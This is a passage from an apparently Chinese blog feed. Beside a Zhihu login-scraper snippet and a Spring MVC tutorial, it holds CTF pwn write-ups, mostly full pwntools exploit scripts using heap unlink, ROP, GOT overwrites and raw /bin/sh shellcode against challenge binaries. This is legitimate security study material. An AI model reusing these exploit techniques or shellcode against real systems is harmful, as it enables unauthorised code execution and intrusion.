把验证码图片保存到当前目录，手动识别验证码 :return: """ t = str(int(time.time() * 1000)) captcha_url = 'https://www.zhihu.com/captcha.gif?r=' + t + "&amp;type=login" r = session.get(captcha_url, headers=headers) with open('captcha.jpg', 'wb') as f: f.write(r.content) captcha = input("验证码：") return captcha 登录. 1234567891011121314def login(email, password): login_url = 'https://www.zhihu.com/login/email' data = &#123; 'email': email, 'password': password, '_xsrf': get_xsrf(), "captcha": get_captcha(), 'remember_me': 'true'&#125; response = session.post(login_url, data=data, headers=headers) login_code = response.json() print(login_code['msg']) for i in session.cookies: print(i) session.cookies.save() 复制代码请求成功后,session会自动把服务端的返回的cookie信息填充到session.cookies对象中,下次请求时,客户端就可以自动携带这些cookie去访问那些需要登录的页面了.]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwnable-kr]]></title>
    <url>%2Fposts%2Fc692c40b%2F</url>
    <content type="text"><![CDATA[unlinkunlink函数可以任意写,程序unlink之后直接结束,只能覆盖返回地址 12345678void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125; main函数结尾汇编代码如下,可以更改ebp从而劫持esp到可控区域,ret到shell 123480485ff: 8b 4d fc mov -0x4(%ebp),%ecx ;ecx = [ebp - 4]8048602: c9 leave ;mov esp, ebp;pop ebp8048603: 8d 61 fc lea -0x4(%ecx),%esp ;esp = [ecx - 4]8048606: c3 ret; 12345678910111213141516171819from pwn import *r = process("./unlink")r.recvuntil("leak: ")stack = int(r.recvline(),16)r.recvuntil("leak: ")heap = int(r.recvline(),16)print "stack: " + hex(stack)print "heap: " + hex(heap)gdb.attach(r)payload = p32(0x80484eb) + p32(heap + 0xc) + "a" * 8 + p32(stack - 0x20) + p32(heap + 0x10)#FD = stack - 0x20;BK = heap + 0x10;heap + 0x10 = stack - 0x20;stack - 0x1c = heap + 0x10;#stack - 0x1c即unlink被调用者保存的ebp,从而更改ebpr.sendline(payload)r.interactive() fd 标准输入的fd为0,以0x1234(4660)为命令行参数即可 col bof123456789from pwn import *r = remote("pwnable.kr","9000")payload = p32(0xcafebabe) * 0x10#懒得看偏移了r.sendline(payload)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-鹏城杯-2018-quals]]></title>
    <url>%2Fposts%2F5757580f%2F</url>
    <content type="text"><![CDATA[code爆破出进入字符串,ROP即可. 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process("./code")r = remote("58.20.46.151","38204")context.log_level = 'debug'elf = ELF("./code")poprdi_ret = 0x400983poprsi_pop_ret = 0x400981name = "wyBTs\n"r.recvuntil("e:\n")r.send(name)r.recvuntil("save\n")payload = "a" * 0x78payload += p64(poprdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"])payload += p64(0x400801)r.send(payload)data = r.recvuntil("save\n")libc = u64(data[13:19].ljust(8,"\x00"))print "libc: " + hex(libc)payload = "a" * 0x78payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(elf.got["puts"] + 8) + p64(0) + p64(elf.plt["read"])payload += p64(0x400801)r.send(payload)r.recvuntil("ss\n")r.send("/bin/sh\x00")r.recvuntil("save\n")payload = "a" * 0x78payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(elf.got["read"]) + p64(0) + p64(elf.plt["read"])payload += p64(poprdi_ret) + p64(elf.got["puts"] + 8) + p64(elf.plt["read"])r.send(payload)r.send(p64(libc - 0x2a300))r.interactive() overInt 第一关爆破处理,有多种解. 五个数字的和正确即可. 使用整数溢出过校验即可单字节任意写. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105from pwn import *#context.log_level = 'debug'elf = ELF("./overInt")poprdi_ret = 0x400b13poprsi_pop_ret = 0x400b11payload = p64(poprdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts'])payload += p64(0x40087F)nums = len(payload)numbers = 0x5f9ccc8fwhile 1: #r = process("./overInt") r = remote("58.20.46.148","35272") r.recvuntil(": \n") r.send(p32(numbers)) if "wrong" in r.recv(): r.close() numbers += 1 continue number = 5 r.send(p32(number)) r.recvuntil(": \n") number = 543372146 r.send(p32(number)) r.recvuntil(": \n") number = 0 r.send(p32(number)) r.recvuntil(": \n") number = 0 r.send(p32(number)) r.recvuntil(": \n") number = 0 r.send(p32(number)) r.recvuntil(": \n") number = 0 r.send(p32(number)) if "no!" in r.recv(): r.close() numbers += 1 continue r.send(p32(nums)) breaki = 0offset = 0x38while i &lt; nums: r.recvuntil("?\n") r.send(p32(i + offset)) r.recvuntil("?\n") r.send(payload[i]) i += 1data = r.recv()libc = u64(data[0x13:0x19].ljust(8,"\x00")) - 0x2a300 - 0x45390print "libc: " + hex(libc)payload = p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(elf.got['puts']) + p64(0) + p64(libc + 0x1b92) + p64(8) + p64(elf.plt['read'])payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(elf.got['puts'] + 8) + p64(0) + p64(libc + 0x1b92) + p64(8) + p64(elf.plt['read'])payload += p64(poprdi_ret) + p64(elf.got['puts'] + 8) + p64(elf.plt['puts'])nums = len(payload)r.send(p32(numbers))if "wrong" in r.recv(): r.close() numbers += 1number = 5r.send(p32(number))r.recvuntil(": \n")number = 543372146r.send(p32(number))r.recvuntil(": \n")number = 0r.send(p32(number))r.recvuntil(": \n")number = 0r.send(p32(number))r.recvuntil(": \n")number = 0r.send(p32(number))r.recvuntil(": \n")number = 0r.send(p32(number))if "no!" in r.recv(): r.close() numbers += 1r.send(p32(nums))i = 0offset = 0x38while i &lt; nums: r.recvuntil("?\n") r.send(p32(i + offset)) r.recvuntil("?\n") r.send(payload[i]) i += 1r.send(p64(libc + 0x45390))r.send("/bin/sh\x00")r.interactive() notesize读取可以溢出到偏移,堆可执行,可以写shellcode到堆然后用堆地址覆盖got表,shellcode长度为13以下.调用read读取真正得shellcode. 123456789101112131415161718192021222324252627282930from pwn import *context.log_level = 'debug'def add(index, size, content): r.sendline("1") r.sendline(str(index)) r.send(size) r.send(content)#0&lt;=index&lt;=25,0&lt;=size&lt;=13#r = remote("58.20.46.149","41643")r = process("./note")r.recvuntil("not found" + " " * 0x11 + "\n")shellcode = asm('''start: xor rax, rax syscall dec edx mov rsi, rcx jmp start ''',arch = "amd64")add(0, str(13) + "\x00" * 8 + p32(0xfffffff3) + "\n", shellcode)r.sendline('5')r.sendline('\x90' * 30 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")r.interactive() \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05. 1234567891011121314 0: 31 c0 xor eax,eax 2: 48 bb d1 9d 96 91 d0 movabs rbx,0xff978cd091969dd1 9: 8c 97 ff c: 48 f7 db neg rbx f: 53 push rbx10: 54 push rsp11: 5f pop rdi12: 99 cdq13: 52 push rdx14: 57 push rdi15: 54 push rsp16: 5e pop rsi17: b0 3b mov al,0x3b19: 0f 05 syscall]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-BackEnd-Spring-MVC-基础]]></title>
    <url>%2Fposts%2F80e50820%2F</url>
    <content type="text"><![CDATA[概念Spring框架是一个轻量级的开源企业应用开发框架,包含很多不同的子模块. 在早期Java Web的开发中,统一把显示层,控制层,数据层的操作全部交给JSP或者Java Bean来进行处理.这导致了JSP和Java Bean,Java代码和HTML代码之间严重耦合,代码难以复用. 很快这种方式就被Servlet + JSP + Java Bean所替代了,也就是MVC模式的初始形态. 模型-视图-控制器模式,把软件系统分为三个基本部分:模型(Model),视图(View)和控制器(Controller). 控制器(Controller):负责转发请求,对请求进行处理. 视图(View):界面设计人员进行图形界面设计. 模型(Model):程序员编写程序应有的功能,数据库专家进行数据管理和数据库设计(可以实现具体的功能). 为解决持久层中的数据库编程,Spring MVC将传统的模型层被拆分为了业务层(Service)和数据访问层(DAO,Data Access Object),在Service下可以通过Spring的声明式事务操作数据访问层,而在业务层上还允许访问NoSQL. 一个Java Bean必须拥有以一个无参的构造器,通过get/set方法访问参数,同时支持持久化. 所有JSP文件都放在WEB-INF目录下,因此无法被直接访问. 开发环境IDEA(或其他IDE),JDK. 项目属性选择Spring-&gt;Spring MVC即可. Spring MVCSpring MVC是Spring的一个子模块,可以帮助开发者更快速的开发一个MVC应用. 下面是部分功能列表 Dispatcher Servlet. 基于XML的配置文件. 数据绑定(包括数据类型转化). 内置常见校验器. 支持多种视图技术. Dispatcher ServletSpring MVC内置的请求转发Servlet,配置于部署描述符(WEB-INF\web.xml). 123456789101112131415161718192021222324&lt;servlet&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;!-- 是否启动时init --&gt; &lt;!-- &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;&#123;path&#125;&lt;/param-value&gt; &lt;/init-param&gt; 用于改变默认配置文件 --&gt; &lt;!-- &lt;multipart-config&gt; &lt;max-file-size&gt;20848820&lt;/max-file-size&gt; &lt;/multipart-config&gt; 文件上传必须配置 --&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;!-- 表示匹配所有uri --&gt;&lt;/servlet-mapping&gt; 默认初始化时在WEB-INF目录下寻找servletName-servlet.xml配置文件,可使用&lt;init-param&gt;自定义配置文件. ControllerSpring2.5前开发控制器需要实现org.springframework.web.servlet.mvc.Contrtoller接口.对应配置文件要配置请求映射. Spring2.5后引入了注释类型Controller和RequestMapping. 其中Controller声明控制器,需要在配置文件声明spring-context(idea自动配置)并应用&lt;component-scan/&gt;元素.RequestMapping用于映射一种请求或方法,有默认属性value,和限制处理方法的method. 基于注解的控制器比之前有几个优点 一个控制器类处理多个动作. 请求映射不用写在配置文件中. 请求处理方法支持的方法参数类型 Servlet API中的Request或Response对象.ServletRequest或HttpServletRequest等.获得请求参数. Servlet API中的HttpSession对象. org.springframework.web.context.request里的WebRequest或NativeWebRequest. java.util.Locale. java.io.InputStream/java.io.Reader.其值是Servlet API的原始的InputStream/Reader. java.io.OutputStream/java.io.Writer.其值是Servlet API的原始OutputStream/Writer. org.springframework.http.HttpMethod.HTTP请求的方法. java.security.Principal.包含当前身份验证的用户. HttpEntity&lt;?&gt;. java.util.Map/org.springframework.ui.Model/org.springframework.ui.ModelMap.装饰web视图暴露的的隐式模型. org.springframework.web.servlet.mvc.support.RedirectAttributes.重定向传值. 命令或表单对象. org.springframework.validation.Errors/org.springframework.validation.BindingResult.前命令之前或表单对象验证结果. org.springframework.web.bind.support.SessionStatus. org.springframework.web.util.UriComponentsBuilder.一个builder用于准备一个URL相对于当前请求的host,port,scheme,context path和servlet映射的文字部分. @PathVariable.注解参数用于获取URI模板变量. @MatrixVariable.注解参数访问位于URI路径的键值对. @RequestParam.注解参数访问特定的Servlet请求参数.获得请求参数并转换为声明的方法参数类型. @RequestHeader.注解参数访问Servlet的HTTP请求中特殊的headers.参数值转换为声明的方法参数类型. @RequestBody.注解参数访问HTTP请求的body.参数值使用HttpMessageConverters转换为声明的方法参数类型. @RequestPart.注解参数获取的content中的multipart/form-data要求的部分. 支持的返回值类型 ModelAndView,这个model隐含command对象和@ModelAttribute注释的结果. Model,返回对象来表示模型,利用RequestToViewNameTranslator把请求转换为视图名称.这个model隐含command对象和@ModelAttribute注释结果. Map,返回对象来表示模型,利用RequestToViewNameTranslator把请求转换为视图名称.这个model隐含command对象和@ModelAttribute注释结果. View,这个model隐含command对象和@ModelAttribute注释的结果.处理方法通过声明的Model类型的参数来编程填充这个模型. String,这个String值被Spring MVC解读为合理的视图名称.这个model隐含command对象和@ModelAttribute注释的结果.处理方法通过声明的Model类型的参数来编程填充这个模型. void,返回空void表示方法自己处理响应. HttpEntity&lt;?&gt;/ResponseEntity&lt;?&gt;,用来提供使用Servlet中HTTP中response中的headers和contents. Callable&lt;?&gt;,当Spring MVC管理的一个应用想要通过异常的形式返回参数. DeferredResult&lt;?&gt;,当应用想要通过它选择的线程来产生返回值,可以使用这个参数. 其他任意类型,被Spring认为是view中的model属性. @ModelAttribute用于参数时隐式添加对象到Model对象或者用于方法时使方法在该控制器类调用请求处理方法前调用. 转化器和格式化转化器需要实现接口org.springframework.core.convert.converter.Converter并在配置文件中配置. 格式化需要实现接口org.springframework.format.Formatter并在配置文件中配置或者使用FormatterRegistrar接口注册. tips:在web层一般使用Formatter. 验证器限制转化后的模型值的范围,包括Spring验证器和JSR 303验证. Spring验证器需实现org.springframework.validation.Validator接口,验证器不需要显示注册,但发送的错误信息可以自定义,自定义文件需要通过配置文件声明messageSource bean来扫描. JSR 303验证不需要验证器,只需要利用JSR 303标注类型嵌入约束即可,对应错误信息可以使用自定义文件覆盖. 配置文件样例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;bean name="/input" class="com.warden.input" /&gt; &lt;!-- 配置控制器(非注解) --&gt; &lt;bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="suffix" value=".jsp" /&gt; &lt;property name="prefix" value="/WEB-INF/jsp/" /&gt; &lt;/bean&gt; &lt;!-- 处理视图映射 --&gt; &lt;context:component-scan base-package="com.warden" /&gt; &lt;!-- 用于扫描注解的控制器和服务 --&gt; &lt;mvc:annotation-driven/&gt; &lt;mvc:resources mapping="/css/**" location="/css/" /&gt; &lt;mvc:resources mapping="/*.html" location="/" /&gt; &lt;!-- 为了正确处理静态资源进行映射 --&gt; &lt;mvc:annotation-driven conversion-service="conversionService"/&gt; &lt;!-- 为conversion-service属性赋bean名称 --&gt; &lt;bean id="conversionService" class="org.springframework.context.support.ConversionServiceFactoryBean"&gt; &lt;property name="converters"&gt; &lt;list&gt; &lt;bean class="com.warden.InputConverter"&gt; &lt;constructor-arg type="java.lang.String" value="aaa"/&gt; &lt;/bean&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id="conversionService" class="org.springframework.format.support.FormattingConversionServiceFactoryBean"&gt; &lt;property name="formatters"&gt; &lt;list&gt; &lt;bean class="com.warden.InputFormatter"&gt; &lt;constructor-arg type="java.lang.String" value="aaa"/&gt; &lt;/bean&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 用于配置对应的转发器和格式化器 --&gt; &lt;bean id="messageSource" class="org.springframework.context.support.ReloadableResourceBundleMessageSource"&gt; &lt;property name="basename" value="***" /&gt; &lt;/bean&gt; &lt;!-- 用于配置自定义错误信息文件 --&gt; &lt;bean id="multipartResolver" class="org.springframework.web.multipart.support.StandardMultipartHttpServletRequest"&gt; &lt;/bean&gt; &lt;!-- 文件上传配置 --&gt;&lt;/beans&gt; 数据绑定和表单标签即将用户输入直接与模型属性绑定,通过元素的path属性绑定即可,使用需声明taglib指令. 文件下载与上传简述Spring MVC中前端上传的文件会包含在一个MultipartFile对象中,只需要用类型为MultipartFile的属性编写一个domain类.然后使用org.springframework.web.multipart.MultipartFile类的方法操作这个属性即可. Servlet3.0以下需要使用其他组件实现文件上传(Apache Commons FileUpload元件),这里不涉及这种情况. Servlet3.0及以上只需要对上传文件的Servlets以@MultipartConfig进行标注即可.(DispatcherServlet可以使用&lt;multipart-config&gt;来代替标注,然后在配置文件中配置) 文件下载只需要在控制器里完成 请求处理方法返回void,在方法中添加HttpServletResponse参数 将响应内容ContentType设为文件内容类型(不清楚可以设置为APPLICATION/OCTET-STREAM) 添加一个Content-Disposition的HTTP响应标题,并赋值:attachment;filename=fileName来设置默认文件名 使用response的getOutputStream方法将文件字节流写入即可 第四步示例. 123456FileInputStream f = new FileInputStream(file);BufferedInputStream buf = new BufferedInputStream(f);byte[] bytes = new byte[buf.available()];OutputStream os = response.getOutputStream();buf.read(bytes);os.write(bytes); 为了防止资源泄露可以添加对登录状态的check和referer来限制资源的发送. Spring MVC请求解析请求离开浏览器以后,第一站到达的就是DispatcherServlet,然后DispatcherServlet将这些请求发送给Spring MVC的控制器. DispatcherServlet会查询一个或多个处理器映射来确定请求的下一站在哪里,处理器映射会根据请求所携带的URL信息来进行决策.一旦选择了合适的控制器,DispatcherServlet会将请求发送给选中的控制器. 当控制器在完成逻辑处理后,通常会产生一些信息,这些信息需要以用户友好的方式进行格式化,一般会是 HTML,所以信息需要发送给一个视图,通常会是JSP. 控制器所做的最后一件事就是将模型数据打包,并且表示出用于渲染输出的视图名.它接下来会将请求连同模型和视图名发送回DispatcherServlet. 既然DispatcherServlet已经知道由哪个视图渲染结果,最后一站是视图的实现,在这里它交付模型数据,请求的任务也就完成了.]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>BackEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-xnuca-2018-quals]]></title>
    <url>%2Fposts%2F659cbaf1%2F</url>
    <content type="text"><![CDATA[Code_Interpreter程序逻辑为读取code文件里的数据流,然后根据关键函数操作. 跟踪数据流得出表达式. 获得flag. SteakIDA分析,有两个漏洞点. delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout的_IO_write_base指针到想泄露的内存区域. 开始使用的是劫持__malloc_hook到one_gadget,条件不足. 然后泄露environ并根据偏移算出main函数返回地址所在的栈地址,使用ROP调用mprotect修改bss的页属性写shellcode,getshell失败.最后复现使用open读取flag文件. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107from pwn import *buf = 0x6021A0def add(size,buf): r.sendline('1') r.sendlineafter('size:\n', str(size)) r.sendlineafter('buf:\n', buf) r.recvuntil('&gt;\n', timeout = 1)def delete(index): r.sendline('2') r.sendlineafter('index:\n', str(index)) r.recvuntil('&gt;\n', timeout = 1)def edit(index,size,buf): r.sendline('3') r.sendlineafter('index:\n', str(index)) r.sendlineafter('size:\n', str(size)) r.sendafter('buf:\n', buf) r.recvuntil("&gt;\n", timeout = 1)def copy(sindex, dindex, length): r.sendline('4') r.sendlineafter('index:\n', str(sindex)) r.sendlineafter('index:\n', str(dindex)) r.sendlineafter('length:\n', str(length)) r.recvuntil('&gt;\n',timeout = 1)r = process(['./steak'], env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)# r = remote("106.75.115.249", "39453")r.recvuntil('&gt;\n', timeout = 1)add(0x90, "1")#0add(0x90, "1")#1add(0x90, "1")#2payload = p64(0) + p64(0x91) + p64(buf - 0x18) + p64(buf - 0x10) + "a" * 0x70 + p64(0x90) + p64(0xa0)edit(0, 0xb0, payload)delete(1)# buf = &amp;buf - 0x18add(0x120, "1")#3payload = p64(0x6021A0) * 4 + p64(0x602180) + p64(0x6021c0) + p64(0x602500)edit(0, 0x40, payload)copy(1, 2, 8)# 4 -&gt; _IO-2_1_stdout_payload = p64(0xfbad3887) + "\x11" * 24 + "\x40"#根据相对偏移溢出_IO_write_baser.sendline('3')r.sendlineafter('index:\n', str(4))r.sendlineafter('size:\n', str(0x28))r.sendafter('buf:\n', payload)data = r.recvuntil("&gt;\n")libc = u64(data[:8].ljust(8, "\x00")) - 0x3c5640print "libc: " + hex(libc)# payload = p64(libc + 0x45216) + p64(libc + 0x3c4b10)# edit(2, 0x20, payload)# # 4 -&gt; one_gadget,5 -&gt; __malloc_hook# copy(2, 5, 8)# r.sendline('1')# r.sendlineafter('size:\n', str(16))payload = p64(0xfbad3887) + "\x11" * 24 + p64(libc + 0x3c6f38) + p64(libc + 0x3c6f40)# 根据libc地址 + 偏移溢出_IO_write_baser.sendline('3')r.sendlineafter('index:\n', str(4))r.sendlineafter('size:\n', str(0x30))r.sendafter('buf:\n', payload)data = r.recvuntil("&gt;\n")stack = u64(data[:8].ljust(8, "\x00")) - 0xf0#调试得出main函数返回地址的栈地址print "stack: " + hex(stack)payload = p64(stack)edit(2, 0x10, payload)# 4-&gt;stack#payload = p64(libc + 0x45216)#r.sendline('3')#r.sendlineafter('index:\n', str(4))#r.sendlineafter('size:\n', str(0x10))#r.sendafter('buf:\n', payload)#r.sendline('0')x86_shellcode = asm("mov eax, 0x5; mov ebx, 0x602600; mov ecx, 0; int 0x80; mov ebx, eax; mov eax, 3; mov ecx, 0x602700; mov edx, 0x40; int 0x80; mov eax, 4; mov ebx, 1; mov ecx, 0x602700; mov edx, 0x40; int 0x80", arch = 'amd64', os = 'linux')edit(3, 0x100, x86_shellcode)payload = p64(0x6021A0) + p64(0x602180) + p64(0x6021c0) + p64(0x602600)edit(0, 0x30, payload)edit(3, 0x10, "flag")pop_rdi = 0x400ca3# pop rdi;retpprsi = 0x400ca1# pop rsi; pop r15;retpop_rdx = 0x1b92 + libc# pop rdx; retpayload = p64(pop_rdi) + p64(0x602000) + p64(pprsi) + p64(0x1000) + p64(0) + p64(pop_rdx) + p64(7) + p64(libc + 0x101770) + p64(0x602500)r.sendline('3')r.sendlineafter('index:\n', str(4))r.sendlineafter('size:\n', str(0x50))r.sendafter('buf:\n', payload)r.sendlineafter('&gt;\n','0')r.interactive() 打印出flag. gets同deaslr.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-Jarvis]]></title>
    <url>%2Fposts%2F1699a56d%2F</url>
    <content type="text"><![CDATA[BASIC公倍数跑程序即可. 德军的密码费纳姆密码,密钥长度12位,密文长度84位,密文7位一组. 将密文七位一组转成数字以后与密钥进行各种运算,最终试出是异或. -.-字符串摩斯密码. A Piece Of Cake词频分析. base64?base32解码,转hex为ASCII即可. 关于USS Labsearch即可. veryeasyUTF-8打开发现flag字符串. ROPGadget对应查询机器码即可. Help!!binwalk -e即可. 握手包aircrack-ng -w password.txt wifi.cap. 取证google即可. shellcode.\shellcodeexec.x32.exe &lt;文件内容&gt;. 熟悉的声音声音联想到摩斯密码,解出:JBLUWEWNZ,凯撒一波获得flag. 段子0xEFBF0xBDEF0xBFBD. 美丽的实验室logoStegsolve-&gt;Frame Broswer 手贱有一个字母l,去掉正好32位解密出flag. veryeasyRSA123456789import gmpy2p = 3487583947589437589237958723892346254777q = 8767867843568934765983476584376578389e = 65537on = (p-1) * (q-1)d = gmpy2.invert(e,on)print d 神秘的文件Binwalk发现为磁盘文件. 12mkdir hhmount haha hh 发现里面大量文件,使用python遍历获得flag. Secret抓包看Response. PWN[XMAN]level0栈溢出,只开了NX,直接溢出返回地址到程序提供的函数即可. [XMAN]level1栈溢出,而且直接给了栈地址,输入shellcode并溢出返回地址到栈上的shellcode即可. 123456789101112131415from pwn import *r = remote("pwn2.jarvisoj.com","9877")#r = process("./level1")data = r.recvuntil("?\n")stack = int(data[14:22],16)print hex(stack)shellcode = asm(shellcraft.i386.linux.sh())payload = shellcode + "a" * (0x8c - len(shellcode))payload += p32(stack)r.send(payload)r.interactive() [XMAN]level2栈溢出,开了NX,ROP调用system即可,程序提供了&quot;/bin/sh&quot;字符串. 1234567891011121314from pwn import *r = remote("pwn2.jarvisoj.com","9878")#r = process("./level2")elf = ELF("./level2")r.recvuntil(":\n")#gdb.attach(r)payload = "a" * 0x8cpayload += p32(elf.plt["system"]) + p32(0) + p32(0x804a024)r.send(payload)r.interactive() [XMAN]level3栈溢出,NX+Partial RELRO,write打印GOT表获得libc基址,read覆盖GOT表并写入参数. 123456789101112131415161718192021222324from pwn import *r = remote("pwn2.jarvisoj.com","9879")elf = ELF("./level3")ppp_ret = 0x08048519r.recvuntil(":\n")#gdb.attach(r)payload = "a" * 0x8cpayload += p32(elf.plt["write"]) + p32(ppp_ret) + p32(1) + p32(elf.got["write"]) + p32(4)payload += p32(elf.plt["read"]) + p32(ppp_ret) + p32(0) + p32(elf.got["write"]) + p32(4)payload += p32(elf.plt["read"]) + p32(ppp_ret) + p32(0) + p32(elf.got["write"] + 4) + p32(10)payload += p32(elf.plt["write"]) + p32(ppp_ret) + p32(elf.got["write"] + 4)r.send(payload)libc = u32(r.recv().ljust(4,"\x00")) - 0xdafe0#nm -D libc-2.19.so | grep writeprint "libc: " + hex(libc)r.send(p32(libc + 0x40310))r.send("/bin/sh\x00")r.interactive() [XMAN]level4和level3基本一样,没有提供libc,开始找最后三位偏移,找不到. 使用pwntools的DynELF模块泄露出system位置即可. 123456789101112131415161718192021222324252627from pwn import *#r = process("./level4")r = remote("pwn2.jarvisoj.com","9880")elf = ELF("./level4")ppp_ret = 0x08048509main = elf.symbols['main']def leak(address): payload = 'a' * 0x8c payload += p32(elf.plt["write"]) + p32(ppp_ret) + p32(1) + p32(address) + p32(4) + p32(main) r.send(payload) data = r.recv(4) log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) return datad = DynELF(leak,elf=ELF('./level4'))system = d.lookup('system','libc')log.success("system address =&gt; &#123;&#125;".format(hex(system)))payload = 'a' * 0x8cpayload += p32(elf.plt["read"]) + p32(ppp_ret) + p32(0) + p32(elf.got["write"]) + p32(8)payload += p32(system) + p32(main) + p32(elf.got["write"])r.send(payload)r.send('/bin/sh\x00')r.interactive() [XMAN]level2(x64)和32位的差别为x86-64前六个参数使用rdi,rsi,rdx,rcx,r8,r9寄存器传递. [XMAN]level3(x64)和32位的差别为x86-64前六个参数使用rdi,rsi,rdx,rcx,r8,r9寄存器传递. [XMAN]level5123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = "debug"context.arch = "amd64"r = remote("pwn2.jarvisoj.com","9884")elf = ELF("./level3_x64")poprdi_ret = 0x4006b3poprsi_pop_ret = 0x4006b1r.recvuntil(":\n")payload = "a" * 0x88payload += p64(poprdi_ret) + p64(1) + p64(poprsi_pop_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["write"])payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["read"])payload += p64(elf.sym['_start'])r.send(payload)libc = u64((r.recv())[0:8].ljust(8,"\x00")) - 0xef3b0# nm -D libc-2.19.so | grep writeprint "libc: " + hex(libc)r.send(p64(libc + 0xf8590))# write@got -&gt; mprotectpoprdx_ret = libc + 0x1b8esleep(1)payload = "a" * 0x88payload += p64(poprdi_ret) + p64(0x600000) + p64(poprsi_pop_ret) + p64(0x1000) + p64(0) + p64(poprdx_ret) + p64(7) + p64(elf.plt["write"])payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(0x600A88) + p64(0) + p64(poprdx_ret) + p64(0x100) + p64(elf.plt["read"])payload += p64(0x600A88)r.send(payload)r.send(asm(shellcraft.sh()))r.interactive() [Xman]level6_x64delete后没有清除指针,先malloc多个小chunk,free后malloc一个大的进行堆布局,触发unlink.之后就可以任意读写了. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *from LibcSearcher import *context.log_level = "debug"def List(): r.sendline("1") data = r.recvuntil("Your choice: ") return datadef New(size, content): r.sendline("2") r.sendlineafter("Length of new note: ", str(size)) r.sendafter("Enter your note: ", content) r.recvuntil("Your choice: ")def Edit(index, size, content): r.sendline("3") r.sendlineafter("Note number: ", str(index)) r.sendlineafter("Length of note: ", str(size)) r.sendafter("Enter your note: ", str(content)) r.recvuntil("Your choice: ")def Delete(index): r.sendline("4") r.sendlineafter("Note number: ", str(index)) r.recvuntil("Your choice: ")#r = process("./freenote_x64")r = remote("pwn2.jarvisoj.com", "9886")#libcso = ELF("/lib/x86_64-linux-gnu/libc.so.6")libcso = ELF("./libc-2.19.so")r.recvuntil("Your choice: ")New(0x1, "a" * 0x1)#0New(0x1, "a" * 0x1)#1New(0x1, "a" * 0x1)#2Delete(0)New(0x1, "a" * 0x1)#0#libc = u64(List()[3:9].ljust(8, "\x00")) - 0x3c4b61libc = u64(List()[3:9].ljust(8, "\x00")) - 0x3c2761New(0x1, "a" * 0x1)#3New(0x1, "a" * 0x1)#4New(0x1, "a" * 0x1)#5Delete(0)Delete(2)New(0x1000, "a" * 0x1000)#0Delete(0)New(0x8, "a" * 0x8)#0New(0x1, "a" * 0x1)#2heap = u64(List().split("\n1.")[0][11:15].ljust(8, "\x00")) - 0x1940Delete(0)Delete(1)Delete(2)Delete(3)payload = p64(0) + p64(0x81) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + "a" * 0x60payload += p64(0x80) + p64(0x90) + "a" * 